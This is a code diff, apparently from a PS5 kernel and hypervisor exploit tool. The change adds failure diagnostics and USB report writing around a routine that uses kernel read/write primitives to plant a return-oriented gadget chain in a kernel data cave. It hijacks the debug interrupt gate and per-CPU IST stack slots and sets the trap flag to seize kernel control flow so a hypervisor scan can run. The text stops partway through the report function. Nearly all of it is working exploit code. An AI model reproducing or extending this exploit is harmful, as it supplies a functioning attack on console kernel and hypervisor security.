@@ -126,10 +126,12 @@ extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;
 #define IRET_OFF 0x20ULL
 #define STACK_TOP_OFF 0x50ULL
 #define FALLBACK_SIZE 0x100ULL
+#define ARM_CONT_CHAIN_QWORDS 11ULL
 #define SAVE_STATE 0x00ULL
 #define SAVE_GATE_LO 0x08ULL
 #define SAVE_GATE_HI 0x10ULL
 #define SAVE_ISTS 0x18ULL
+#define SAVE_ACTIVE_SLOT 0x98ULL
 #define STATE_ARMED 0x5355534e45432d31ULL /* "1-CENSUS" */
 
 #define USB_ROOT_FMT "/mnt/usb%d"
@@ -142,6 +144,10 @@ _Static_assert(CAVE_HANDLER_OFF + 0x400 <= CAVE_AP_SOURCE_OFF,
                "handler overlaps AP source");
 _Static_assert(CAVE_AP_SOURCE_OFF + AP_COPY_SIZE <= CAVE_SAVE_OFF,
                "AP source overlaps save state");
+_Static_assert(SAVE_ACTIVE_SLOT >= SAVE_ISTS + NCPU * sizeof(uint64_t) &&
+                   CAVE_SAVE_OFF + SAVE_ACTIVE_SLOT + sizeof(uint64_t) <=
+                       CAVE_REPORT_OFF,
+               "carrier slot marker overlaps saved state or report");
 _Static_assert(CAVE_REPORT_OFF + sizeof(struct census_report) <=
                    CAVE_BITMAP_OFF,
                "report overlaps bitmap");
@@ -185,6 +191,59 @@ struct tss_snapshot {
   int failure;
   int cpu;
   int prior_cpu;
+};
+
+enum carrier_failure {
+  CARRIER_OK = 0,
+  CARRIER_PRECHECK,
+  CARRIER_GATE_ENCODE,
+  CARRIER_AP_STAGE,
+  CARRIER_CHAIN_BUILD,
+  CARRIER_CHAIN_STAGE,
+  CARRIER_FALLBACK_STAGE,
+  CARRIER_SAVE_STAGE,
+  CARRIER_IST_INSTALL_WRITE,
+  CARRIER_IST_INSTALL_READ,
+  CARRIER_CONTEXT_WRITE,
+  CARRIER_RETURN_FRAME_WRITE,
+  CARRIER_GATE_WRITE,
+  CARRIER_POST_GATE_READ,
+  CARRIER_POST_GATE_HIGH,
+  CARRIER_POST_GATE_LOW,
+  CARRIER_POST_STATE_READ,
+  CARRIER_POST_STATE_VALUE,
+  CARRIER_POST_SLOT_READ,
+  CARRIER_POST_SLOT_VALUE,
+  CARRIER_POST_IST_READ,
+  CARRIER_POST_IST_VALUE,
+  CARRIER_AP_NX_TRANSACTION,
+  CARRIER_SUSPEND_TRIGGER,
+};
+
+enum carrier_debug_state {
+  CARRIER_DEBUG_UNKNOWN = -1,
+  CARRIER_DEBUG_NOT_ARMED = 0,
+  CARRIER_DEBUG_ARMED = 1,
+};
+
+struct carrier_diagnostic {
+  uint64_t address;
+  uint64_t expected;
+  uint64_t observed;
+  uint64_t saved_gate_lo;
+  uint64_t saved_gate_hi;
+  uint64_t armed_gate_lo;
+  uint64_t armed_gate_hi;
+  uint64_t live_gate_lo;
+  uint64_t live_gate_hi;
+  uint64_t live_state;
+  uint64_t active_slot;
+  uint64_t live_ist6[NCPU];
+  uint32_t ist_read_mask;
+  int failure;
+  int cpu;
+  int op_rc;
+  int debug_state;
 };
 
 static int kread(uint64_t address, void *out, size_t size) {
@@ -715,6 +774,109 @@ static int inspect_tss_layout(uint64_t saved[NCPU],
   return snapshot->failure == TSS_OK ? 0 : -snapshot->failure;
 }
 
+static const char *carrier_failure_name(int failure) {
+  switch (failure) {
+  case CARRIER_OK:
+    return "none";
+  case CARRIER_PRECHECK:
+    return "carrier precheck";
+  case CARRIER_GATE_ENCODE:
+    return "IDT1 gate encoding";
+  case CARRIER_AP_STAGE:
+    return "AP payload staging";
+  case CARRIER_CHAIN_BUILD:
+    return "carrier chain build";
+  case CARRIER_CHAIN_STAGE:
+    return "carrier chain staging";
+  case CARRIER_FALLBACK_STAGE:
+    return "fallback chain staging";
+  case CARRIER_SAVE_STAGE:
+    return "carrier saved-state staging";
+  case CARRIER_IST_INSTALL_WRITE:
+    return "IST6 install write";
+  case CARRIER_IST_INSTALL_READ:
+    return "IST6 install readback";
+  case CARRIER_CONTEXT_WRITE:
+    return "arm context write";
+  case CARRIER_RETURN_FRAME_WRITE:
+    return "return frame write";
+  case CARRIER_GATE_WRITE:
+    return "IDT1 arm write";
+  case CARRIER_POST_GATE_READ:
+    return "armed IDT1 readback";
+  case CARRIER_POST_GATE_HIGH:
+    return "armed IDT1 high mismatch";
+  case CARRIER_POST_GATE_LOW:
+    return "armed IDT1 low mismatch";
+  case CARRIER_POST_STATE_READ:
+    return "carrier state readback";
+  case CARRIER_POST_STATE_VALUE:
+    return "carrier state mismatch";
+  case CARRIER_POST_SLOT_READ:
+    return "slot-zero marker readback";
+  case CARRIER_POST_SLOT_VALUE:
+    return "slot-zero marker mismatch";
+  case CARRIER_POST_IST_READ:
+    return "armed IST6 readback";
+  case CARRIER_POST_IST_VALUE:
+    return "armed IST6 mismatch";
+  case CARRIER_AP_NX_TRANSACTION:
+    return "AP NX transaction";
+  case CARRIER_SUSPEND_TRIGGER:
+    return "suspend trigger";
+  default:
+    return "unknown";
+  }
+}
+
+static const char *carrier_debug_state_name(int state) {
+  switch (state) {
+  case CARRIER_DEBUG_NOT_ARMED:
+    return "not armed by this attempt";
+  case CARRIER_DEBUG_ARMED:
+    return "armed";
+  default:
+    return "unknown";
+  }
+}
+
+static void init_carrier_diagnostic(struct carrier_diagnostic *diag) {
+  memset(diag, 0, sizeof(*diag));
+  diag->cpu = -1;
+  diag->observed = UINT64_MAX;
+  diag->live_gate_lo = UINT64_MAX;
+  diag->live_gate_hi = UINT64_MAX;
+  diag->live_state = UINT64_MAX;
+  diag->active_slot = UINT64_MAX;
+  diag->debug_state = CARRIER_DEBUG_NOT_ARMED;
+  for (int cpu = 0; cpu < NCPU; cpu++)
+    diag->live_ist6[cpu] = UINT64_MAX;
+}
+
+static void record_carrier_failure(struct carrier_diagnostic *diag,
+                                   enum carrier_failure failure, int cpu,
+                                   int op_rc, uint64_t address,
+                                   uint64_t expected, uint64_t observed) {
+  if (diag->failure != CARRIER_OK)
+    return;
+  diag->failure = failure;
+  diag->cpu = cpu;
+  diag->op_rc = op_rc;
+  diag->address = address;
+  diag->expected = expected;
+  diag->observed = observed;
+}
+
+static int carrier_write64(struct carrier_diagnostic *diag,
+                           enum carrier_failure failure, int cpu,
+                           uint64_t address, uint64_t value) {
+  const int rc = kwrite64(address, value);
+  if (rc)
+    record_carrier_failure(diag, failure, cpu, rc, address, value,
+                           UINT64_MAX);
+  return rc;
+}
+
 static int restore_ists(const uint64_t saved[NCPU]) {
   const uint64_t tss_base = kg(OFF_COMMON_TSS);
   int rc = 0;
@@ -853,7 +1015,7 @@ static int build_passthrough(uint8_t *buf, uint64_t va) {
 }
 
 static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t selected_ist,
-                     uint64_t handler_top) {
+                     uint64_t handler_top, uint64_t active_slot_address) {
   const uint64_t ctx = arm_va + CAVE_ARM_CTX_OFF;
   const uint64_t cont = arm_va + CAVE_ARM_CONT_OFF;
   size_t off = STACK_TOP_OFF;
@@ -873,12 +1035,15 @@ static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t selected_ist,
   memcpy(arm + CAVE_ARM_CTX_OFF + RC_DR7, &(uint64_t){KH_DR7_BP0_EXEC}, 8);
 
   off = CAVE_ARM_CONT_OFF;
-  if (chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RDI_RET)) ||
+  if (chain_store(arm, &off, 0x400, active_slot_address, 0) ||
+      chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RDI_RET)) ||
       chain_q(arm, &off, 0x400, selected_ist - 8) ||
       chain_q(arm, &off, 0x400, kg(OFF_GAD_POP_RCX_RET)) ||
       chain_q(arm, &off, 0x400, handler_top) ||
       chain_q(arm, &off, 0x400, kg(OFF_GAD_STORE_RDI8_RCX_RET)) ||
       chain_q(arm, &off, 0x400, kg(OFF_GAD_IRETQ)))
+    return -1;
+  if (off != CAVE_ARM_CONT_OFF + ARM_CONT_CHAIN_QWORDS * sizeof(uint64_t))
     return -1;
   off += 5 * sizeof(uint64_t);
   return off <= 0x400 ? 0 : -1;
@@ -955,9 +1120,9 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
   return 0;
 }
 
-__attribute__((noinline)) static int
+__attribute__((noinline)) static void
 arm_dr0_and_return(uint64_t db_gate, uint64_t gate_lo, uint64_t arm_ctx,
-                   uint64_t return_frame) {
+                   uint64_t return_frame, struct carrier_diagnostic *diag) {
   uint64_t rsp, rbx, rbp, r12, r13, r14, r15;
   void *resume_label = &&resumed;
 
@@ -969,20 +1134,37 @@ arm_dr0_and_return(uint64_t db_gate, uint64_t gate_lo, uint64_t arm_ctx,
   __asm__ volatile("mov %%r14,%0" : "=r"(r14));
   __asm__ volatile("mov %%r15,%0" : "=r"(r15));
 
-  if (kwrite64(arm_ctx + 0x00, r15) ||
-      kwrite64(arm_ctx + 0x08, r14) ||
-      kwrite64(arm_ctx + 0x10, r13) ||
-      kwrite64(arm_ctx + 0x18, r12) || kwrite64(arm_ctx + RC_RBP, rbp) ||
-      kwrite64(arm_ctx + RC_RSP, return_frame - 7 * sizeof(uint64_t)) ||
-      kwrite64(arm_ctx + 0x30, rbx) ||
-      kwrite64(arm_ctx + RC_RIP, kg(OFF_GAD_RET_TRAMP)) ||
-      kwrite64(return_frame + 0x00, (uint64_t)resume_label) ||
-      kwrite64(return_frame + 0x08, KH_USER_CS) ||
-      kwrite64(return_frame + 0x10, KH_RFLAGS_USER) ||
-      kwrite64(return_frame + 0x18, rsp) ||
-      kwrite64(return_frame + 0x20, KH_USER_SS) ||
-      kwrite64(db_gate, gate_lo))
-    return -1;
+  if (carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + 0x00,
+                      r15) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + 0x08,
+                      r14) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + 0x10,
+                      r13) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + 0x18,
+                      r12) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + RC_RBP,
+                      rbp) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + RC_RSP,
+                      return_frame -
+                          (ARM_CONT_CHAIN_QWORDS + 1) * sizeof(uint64_t)) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + 0x30,
+                      rbx) ||
+      carrier_write64(diag, CARRIER_CONTEXT_WRITE, -1, arm_ctx + RC_RIP,
+                      kg(OFF_GAD_RET_TRAMP)) ||
+      carrier_write64(diag, CARRIER_RETURN_FRAME_WRITE, -1,
+                      return_frame + 0x00, (uint64_t)resume_label) ||
+      carrier_write64(diag, CARRIER_RETURN_FRAME_WRITE, -1,
+                      return_frame + 0x08, KH_USER_CS) ||
+      carrier_write64(diag, CARRIER_RETURN_FRAME_WRITE, -1,
+                      return_frame + 0x10, KH_RFLAGS_USER) ||
+      carrier_write64(diag, CARRIER_RETURN_FRAME_WRITE, -1,
+                      return_frame + 0x18, rsp) ||
+      carrier_write64(diag, CARRIER_RETURN_FRAME_WRITE, -1,
+                      return_frame + 0x20, KH_USER_SS))
+    return;
+  diag->debug_state = CARRIER_DEBUG_UNKNOWN;
+  if (carrier_write64(diag, CARRIER_GATE_WRITE, -1, db_gate, gate_lo))
+    return;
   __asm__ volatile("pushfq\n\t"
                    "orq $0x100, (%%rsp)\n\t"
                    "popfq\n\t"
@@ -991,87 +1173,142 @@ arm_dr0_and_return(uint64_t db_gate, uint64_t gate_lo, uint64_t arm_ctx,
                    :
                    : "memory", "cc");
 resumed:
-  return 0;
+  return;
 }
 
 static int arm_startup_carrier(uint64_t hv_base, uint64_t hv_size,
                                uint64_t scan_lo, uint64_t scan_hi,
                                uint64_t code_base,
-                               const uint64_t saved_ists[NCPU]) {
+                               const uint64_t saved_ists[NCPU],
+                               struct carrier_diagnostic *diag) {
   const uint64_t data_cave = kg(OFF_DATA_CAVE);
   const uint64_t tss_base = kg(OFF_COMMON_TSS);
   const uint64_t db_gate = kg(OFF_IDT) + 16;
   const uint64_t arm_va = data_cave + CAVE_ARM_OFF;
   const uint64_t handler_va = data_cave + CAVE_HANDLER_OFF;
-  uint64_t saved_gate_lo, saved_gate_hi, state;
+  const uint64_t active_slot_address =
+      data_cave + CAVE_SAVE_OFF + SAVE_ACTIVE_SLOT;
+  uint64_t saved_gate_lo = UINT64_MAX, saved_gate_hi = UINT64_MAX;
+  uint64_t state = UINT64_MAX, active_slot = UINT64_MAX;
   uint64_t gate_lo, gate_hi;
   uint8_t arm[0x400], handler[0x400], fallback[FALLBACK_SIZE];
   uint8_t staged[AP_COPY_SIZE], verify[0x400];
 
+  init_carrier_diagnostic(diag);
+
   if (kread64(db_gate, &saved_gate_lo) ||
       kread64(db_gate + 8, &saved_gate_hi) ||
       kread64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, &state) ||
-      census_bin_len == 0 || census_bin_len > sizeof(staged) || state != 0)
+      census_bin_len == 0 || census_bin_len > sizeof(staged) || state != 0) {
+    diag->debug_state = CARRIER_DEBUG_UNKNOWN;
+    record_carrier_failure(diag, CARRIER_PRECHECK, -1, -1,
+                           data_cave + CAVE_SAVE_OFF + SAVE_STATE, 0, state);
     return -1;
+  }
+  diag->saved_gate_lo = saved_gate_lo;
+  diag->saved_gate_hi = saved_gate_hi;
   gate_encode(kg(OFF_GAD_PIVOT_ADD_RSP28_RET),
               (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
-  if (gate_hi != saved_gate_hi)
+  diag->armed_gate_lo = gate_lo;
+  diag->armed_gate_hi = gate_hi;
+  if (gate_hi != saved_gate_hi) {
+    record_carrier_failure(diag, CARRIER_GATE_ENCODE, -1, 0, db_gate + 8,
+                           saved_gate_hi, gate_hi);
     return -2;
+  }
 
   memset(staged, 0, sizeof(staged));
   memcpy(staged, census_bin, census_bin_len);
-  if (kwrite(data_cave + CAVE_AP_SOURCE_OFF, staged, sizeof(staged)))
+  if (kwrite(data_cave + CAVE_AP_SOURCE_OFF, staged, sizeof(staged))) {
+    record_carrier_failure(diag, CARRIER_AP_STAGE, -1, -1,
+                           data_cave + CAVE_AP_SOURCE_OFF, 0, UINT64_MAX);
     return -3;
+  }
   for (size_t checked = 0; checked < sizeof(staged); checked += sizeof(verify)) {
     if (kread(data_cave + CAVE_AP_SOURCE_OFF + checked, verify,
               sizeof(verify)) ||
-        memcmp(verify, staged + checked, sizeof(verify)))
+        memcmp(verify, staged + checked, sizeof(verify))) {
+      record_carrier_failure(diag, CARRIER_AP_STAGE, -1, -1,
+                             data_cave + CAVE_AP_SOURCE_OFF + checked, 0,
+                             UINT64_MAX);
       return -3;
+    }
   }
   if (build_arm(arm, arm_va, tss_ist_slot(tss_base, 0, 6),
-                handler_va + STACK_TOP_OFF) ||
+                handler_va + STACK_TOP_OFF, active_slot_address) ||
       build_handler(handler, handler_va, data_cave, saved_gate_lo, hv_base,
-                    hv_size, scan_lo, scan_hi, code_base))
+                    hv_size, scan_lo, scan_hi, code_base)) {
+    record_carrier_failure(diag, CARRIER_CHAIN_BUILD, -1, -1, arm_va, 0,
+                           UINT64_MAX);
     return -4;
+  }
 
   if (kwrite(arm_va, arm, sizeof(arm)) ||
       kwrite(handler_va, handler, sizeof(handler)) ||
       kread(arm_va, verify, sizeof(verify)) ||
-      memcmp(verify, arm, sizeof(verify)))
+      memcmp(verify, arm, sizeof(verify))) {
+    record_carrier_failure(diag, CARRIER_CHAIN_STAGE, -1, -1, arm_va, 0,
+                           UINT64_MAX);
     return -5;
+  }
   if (kread(handler_va, verify, sizeof(verify)) ||
-      memcmp(verify, handler, sizeof(verify)))
+      memcmp(verify, handler, sizeof(verify))) {
+    record_carrier_failure(diag, CARRIER_CHAIN_STAGE, -1, -1, handler_va, 0,
+                           UINT64_MAX);
     return -5;
+  }
 
   for (int cpu = 1; cpu < NCPU; cpu++) {
     const uint64_t va =
         data_cave + CAVE_FALLBACKS_OFF + (uint64_t)(cpu - 1) * FALLBACK_SIZE;
-    if (build_passthrough(fallback, va))
+    if (build_passthrough(fallback, va)) {
+      record_carrier_failure(diag, CARRIER_FALLBACK_STAGE, cpu, -1, va, 0,
+                             UINT64_MAX);
       return -6;
+    }
     if (kwrite(va, fallback, sizeof(fallback)) ||
         kread(va, verify, sizeof(fallback)) ||
-        memcmp(verify, fallback, sizeof(fallback)))
+        memcmp(verify, fallback, sizeof(fallback))) {
+      record_carrier_failure(diag, CARRIER_FALLBACK_STAGE, cpu, -1, va, 0,
+                             UINT64_MAX);
       return -6;
+    }
   }
 
   if (kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_GATE_LO, saved_gate_lo) ||
-      kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_GATE_HI, saved_gate_hi))
+      kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_GATE_HI, saved_gate_hi)) {
+    record_carrier_failure(diag, CARRIER_SAVE_STAGE, -1, -1,
+                           data_cave + CAVE_SAVE_OFF, 0, UINT64_MAX);
     return -7;
+  }
   for (int cpu = 0; cpu < NCPU; cpu++)
     if (kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_ISTS + (uint64_t)cpu * 8,
-                 saved_ists[cpu]))
+                 saved_ists[cpu])) {
+      record_carrier_failure(diag, CARRIER_SAVE_STAGE, cpu, -1,
+                             data_cave + CAVE_SAVE_OFF + SAVE_ISTS +
+                                 (uint64_t)cpu * 8,
+                             saved_ists[cpu], UINT64_MAX);
       return -7;
-  if (kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED) ||
+    }
+  if (kwrite64(active_slot_address, UINT64_MAX) ||
+      kread64(active_slot_address, &active_slot) ||
+      active_slot != UINT64_MAX ||
+      kwrite64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED) ||
       kread64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, &state) ||
-      state != STATE_ARMED)
+      state != STATE_ARMED) {
+    record_carrier_failure(diag, CARRIER_SAVE_STAGE, -1, -1,
+                           data_cave + CAVE_SAVE_OFF + SAVE_STATE,
+                           STATE_ARMED, state);
     return -7;
+  }
 
-  if (kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + STACK_TOP_OFF))
-    goto rollback;
-  for (int cpu = 1; cpu < NCPU; cpu++) {
-    const uint64_t top = data_cave + CAVE_FALLBACKS_OFF +
-                         (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
-    if (kwrite64(tss_ist_slot(tss_base, cpu, 6), top))
+  for (int cpu = 0; cpu < NCPU; cpu++) {
+    const uint64_t want =
+        cpu == 0 ? arm_va + STACK_TOP_OFF
+                 : data_cave + CAVE_FALLBACKS_OFF +
+                       (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
+    const uint64_t address = tss_ist_slot(tss_base, cpu, 6);
+    if (carrier_write64(diag, CARRIER_IST_INSTALL_WRITE, cpu, address, want))
       goto rollback;
   }
   for (int cpu = 0; cpu < NCPU; cpu++) {
@@ -1079,25 +1316,106 @@ static int arm_startup_carrier(uint64_t hv_base, uint64_t hv_size,
         cpu == 0 ? arm_va + STACK_TOP_OFF
                  : data_cave + CAVE_FALLBACKS_OFF +
                        (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
-    uint64_t actual;
-    if (kread64(tss_ist_slot(tss_base, cpu, 6), &actual) || actual != want)
+    const uint64_t address = tss_ist_slot(tss_base, cpu, 6);
+    uint64_t actual = UINT64_MAX;
+    const int rc = kread64(address, &actual);
+    if (rc || actual != want) {
+      record_carrier_failure(diag, CARRIER_IST_INSTALL_READ, cpu, rc,
+                             address, want, actual);
       goto rollback;
+    }
   }
 
-  if (arm_dr0_and_return(db_gate, gate_lo, arm_va + CAVE_ARM_CTX_OFF,
-                         arm_va + CAVE_ARM_CONT_OFF + 6 * sizeof(uint64_t)))
+  arm_dr0_and_return(db_gate, gate_lo, arm_va + CAVE_ARM_CTX_OFF,
+                     arm_va + CAVE_ARM_CONT_OFF +
+                         ARM_CONT_CHAIN_QWORDS * sizeof(uint64_t),
+                     diag);
+  if (diag->failure != CARRIER_OK)
     goto rollback;
-  uint64_t live_gate_lo, live_gate_hi;
-  if (kread64(db_gate, &live_gate_lo) ||
-      kread64(db_gate + 8, &live_gate_hi) ||
-      live_gate_hi != saved_gate_hi)
-    return -9;
-  if (live_gate_lo != saved_gate_lo) {
-    if (kwrite64(db_gate, saved_gate_lo) ||
-        kread64(db_gate, &live_gate_lo) || live_gate_lo != saved_gate_lo)
-      return -9;
+
+  const int gate_lo_rc = kread64(db_gate, &diag->live_gate_lo);
+  const int gate_hi_rc = kread64(db_gate + 8, &diag->live_gate_hi);
+  const int live_state_rc =
+      kread64(data_cave + CAVE_SAVE_OFF + SAVE_STATE, &diag->live_state);
+  const int active_slot_rc =
+      kread64(active_slot_address, &diag->active_slot);
+  if (gate_lo_rc)
+    record_carrier_failure(diag, CARRIER_POST_GATE_READ, -1, gate_lo_rc,
+                           db_gate, gate_lo, UINT64_MAX);
+  if (gate_hi_rc)
+    record_carrier_failure(diag, CARRIER_POST_GATE_READ, -1, gate_hi_rc,
+                           db_gate + 8, saved_gate_hi, UINT64_MAX);
+  if (live_state_rc)
+    record_carrier_failure(diag, CARRIER_POST_STATE_READ, -1, live_state_rc,
+                           data_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED,
+                           UINT64_MAX);
+  if (active_slot_rc)
+    record_carrier_failure(diag, CARRIER_POST_SLOT_READ, -1, active_slot_rc,
+                           active_slot_address, 0, UINT64_MAX);
+
+  for (int cpu = 0; cpu < NCPU; cpu++) {
+    const uint64_t address = tss_ist_slot(tss_base, cpu, 6);
+    const int rc = kread64(address, &diag->live_ist6[cpu]);
+    if (!rc)
+      diag->ist_read_mask |= 1U << cpu;
+    else
+      record_carrier_failure(diag, CARRIER_POST_IST_READ, cpu, rc, address,
+                             0, UINT64_MAX);
+  }
+
+  const int slot0_read = (diag->ist_read_mask & 1U) != 0;
+  const uint64_t slot0_handler_top = handler_va + STACK_TOP_OFF;
+  if ((!active_slot_rc && diag->active_slot == 0) ||
+      (slot0_read && diag->live_ist6[0] == slot0_handler_top))
+    diag->debug_state = CARRIER_DEBUG_ARMED;
+  else
+    diag->debug_state = CARRIER_DEBUG_UNKNOWN;
+
+  if (!gate_hi_rc && diag->live_gate_hi != saved_gate_hi)
+    record_carrier_failure(diag, CARRIER_POST_GATE_HIGH, -1, 0, db_gate + 8,
+                           saved_gate_hi, diag->live_gate_hi);
+  if (!gate_lo_rc && diag->live_gate_lo != gate_lo)
+    record_carrier_failure(diag, CARRIER_POST_GATE_LOW, -1, 0, db_gate,
+                           gate_lo, diag->live_gate_lo);
+  if (!live_state_rc && diag->live_state != STATE_ARMED)
+    record_carrier_failure(diag, CARRIER_POST_STATE_VALUE, -1, 0,
+                           data_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED,
+                           diag->live_state);
+  if (!active_slot_rc && diag->active_slot != 0)
+    record_carrier_failure(diag, CARRIER_POST_SLOT_VALUE,
+                           diag->active_slot < NCPU ? (int)diag->active_slot
+                                                   : -1,
+                           0, active_slot_address, 0, diag->active_slot);
+  for (int cpu = 0; cpu < NCPU; cpu++) {
+    if (!(diag->ist_read_mask & (1U << cpu)))
+      continue;
+    const uint64_t want =
+        cpu == 0 ? handler_va + STACK_TOP_OFF
+                 : data_cave + CAVE_FALLBACKS_OFF +
+                       (uint64_t)(cpu - 1) * FALLBACK_SIZE + STACK_TOP_OFF;
+    if (diag->live_ist6[cpu] != want)
+      record_carrier_failure(diag, CARRIER_POST_IST_VALUE, cpu, 0,
+                             tss_ist_slot(tss_base, cpu, 6), want,
+                             diag->live_ist6[cpu]);
+  }
+
+  if (diag->failure != CARRIER_OK) {
+    if (!gate_lo_rc && !gate_hi_rc &&
+        diag->live_gate_hi == saved_gate_hi &&
+        diag->live_gate_lo != saved_gate_lo) {
+      uint64_t restored_gate_lo = UINT64_MAX;
+      if (kwrite64(db_gate, saved_gate_lo) ||
+          kread64(db_gate, &restored_gate_lo) ||
+          restored_gate_lo != saved_gate_lo)
+        return -9;
+    }
     goto rollback;
   }
+  if (diag->live_gate_lo != gate_lo ||
+      diag->live_gate_hi != saved_gate_hi ||
+      diag->live_state != STATE_ARMED || diag->active_slot != 0 ||
+      diag->ist_read_mask != (1U << NCPU) - 1)
+    return -9;
   return 0;
 
 rollback:
@@ -1143,52 +1461,62 @@ static size_t appendf(char *out, size_t cap, size_t used, const char *fmt,
   return (size_t)n >= cap - used ? cap : used + (size_t)n;
 }
 
-static int write_unique_preflight(const char *text, size_t size,
-                                  char *saved_path, size_t saved_path_size) {
-  char root[128], name[128], destination[320], temp[320];
+static int write_unique_diagnostic_at_root(
+    const char *root, const char *kind, const char *text, size_t size,
+    char *saved_path, size_t saved_path_size) {
+  char name[128], destination[320], temp[320];
 
+  if (!is_mount_point(root))
+    return -1;
+  for (int n = 1; n < 100; n++) {
+    if (n == 1)
+      snprintf(name, sizeof(name), "%s-%s.txt", REPORT_BASE, kind);
+    else
+      snprintf(name, sizeof(name), "%s-%s-%02d.txt", REPORT_BASE, kind, n);
+    snprintf(destination, sizeof(destination), "%s/%s", root, name);
+    snprintf(temp, sizeof(temp), "%s/%s.tmp", root, name);
+    const int destination_state = path_state(destination);
+    const int temp_state = path_state(temp);
+    if (destination_state < 0 || temp_state < 0)
+      break;
+    if (destination_state || temp_state)
+      continue;
+    int fd = open(temp, O_WRONLY | O_CREAT | O_EXCL, 0600);
+    if (fd < 0) {
+      if (errno == EEXIST)
+        continue;
+      break;
+    }
+    int rc = write_all(fd, text, size);
+    if (!rc)
+      rc = fsync(fd);
+    if (close(fd) && !rc)
+      rc = -1;
+    if (!rc && path_state(destination) != 0)
+      rc = -1;
+    if (!rc && rename(temp, destination))
+      rc = -1;
+    if (!rc)
+      rc = fsync_dir(root);
+    if (rc) {
+      unlink(temp);
+      return -1;
+    }
+    snprintf(saved_path, saved_path_size, "%s", destination);
+    return 0;
+  }
+  return -1;
+}
+
+static int write_unique_diagnostic(const char *kind, const char *text,
+                                   size_t size, char *saved_path,
+                                   size_t saved_path_size) {
+  char root[128];
   for (int usb = 0; usb < 8; usb++) {
     snprintf(root, sizeof(root), USB_ROOT_FMT, usb);
-    if (!is_mount_point(root))
-      continue;
-    for (int n = 1; n < 100; n++) {
-      if (n == 1)
-        snprintf(name, sizeof(name), "%s-preflight.txt", REPORT_BASE);
-      else
-        snprintf(name, sizeof(name), "%s-preflight-%02d.txt", REPORT_BASE,
-                 n);
-      snprintf(destination, sizeof(destination), "%s/%s", root, name);
-      snprintf(temp, sizeof(temp), "%s/%s.tmp", root, name);
-      const int destination_state = path_state(destination);
-      const int temp_state = path_state(temp);
-      if (destination_state < 0 || temp_state < 0)
-        break;
-      if (destination_state || temp_state)
-        continue;
-      int fd = open(temp, O_WRONLY | O_CREAT | O_EXCL, 0600);
-      if (fd < 0) {
-        if (errno == EEXIST)
-          continue;
-        break;
-      }
-      int rc = write_all(fd, text, size);
-      if (!rc)
-        rc = fsync(fd);
-      if (close(fd) && !rc)
-        rc = -1;
-      if (!rc && path_state(destination) != 0)
-        rc = -1;
-      if (!rc && rename(temp, destination))
-        rc = -1;
-      if (!rc)
-        rc = fsync_dir(root);
-      if (rc) {
-        unlink(temp);
-        return -1;
-      }
-      snprintf(saved_path, saved_path_size, "%s", destination);
+    if (write_unique_diagnostic_at_root(root, kind, text, size, saved_path,
+                                        saved_path_size) == 0)
       return 0;
-    }
   }
   return -1;
 }
@@ -1258,7 +1586,64 @@ static int save_preflight_gate_report(
                      (unsigned long long)tss->ist6[cpu]);
   if (used >= sizeof(text))
     return -1;
-  return write_unique_preflight(text, used, saved_path, saved_path_size);
+  return write_unique_diagnostic("preflight", text, used, saved_path,
+                                 saved_path_size);
+}
+
+static int save_carrier_diagnostic(
+    const char *root, const char *model, int arm_rc,
+    const struct carrier_diagnostic *diag, int affinity_rc, int cleanup_rc,
+    int ap_restore_rc, char *saved_path, size_t saved_path_size) {
+  char text[8192];
+  size_t used = 0;
+  const int memory_cleanup_verified =
+      !affinity_rc && !cleanup_rc && !ap_restore_rc;
+  const int safe_without_cold_boot =
+      memory_cleanup_verified &&
+      diag->debug_state == CARRIER_DEBUG_NOT_ARMED;
+
+  used = appendf(
+      text, sizeof(text), used,
+      "ps5-1160-census carrier diagnostic\n"
+      "variant %s\nfirmware 0x%08x\nSoC 0x%x\nmodel %s\n"
+      "Keep private: bounded runtime evidence. No HV bytes are included.\n"
+      "report version %llu\narm rc %d\n"
+      "failure %d (%s) cpu %d op rc %d\n"
+      "address %016llx expected %016llx observed %016llx\n"
+      "saved IDT1 %016llx %016llx\n"
+      "armed IDT1 %016llx %016llx\n"
+      "live IDT1 %016llx %016llx\n"
+      "live state %016llx slot-zero marker %016llx\n"
+      "IST6 read mask 0x%04x\n"
+      "debug register state %d (%s)\n"
+      "affinity restore rc %d\ncarrier cleanup rc %d\n"
+      "AP path restore rc %d\nmemory cleanup verified %d\n"
+      "safe to retry without cold boot %d\n",
+      CENSUS_VARIANT, kernel_get_fw_version(), sceKernelGetMainSocId(), model,
+      (unsigned long long)CENSUS_REPORT_VERSION, arm_rc, diag->failure,
+      carrier_failure_name(diag->failure), diag->cpu, diag->op_rc,
+      (unsigned long long)diag->address,
+      (unsigned long long)diag->expected,
+      (unsigned long long)diag->observed,
+      (unsigned long long)diag->saved_gate_lo,
+      (unsigned long long)diag->saved_gate_hi,
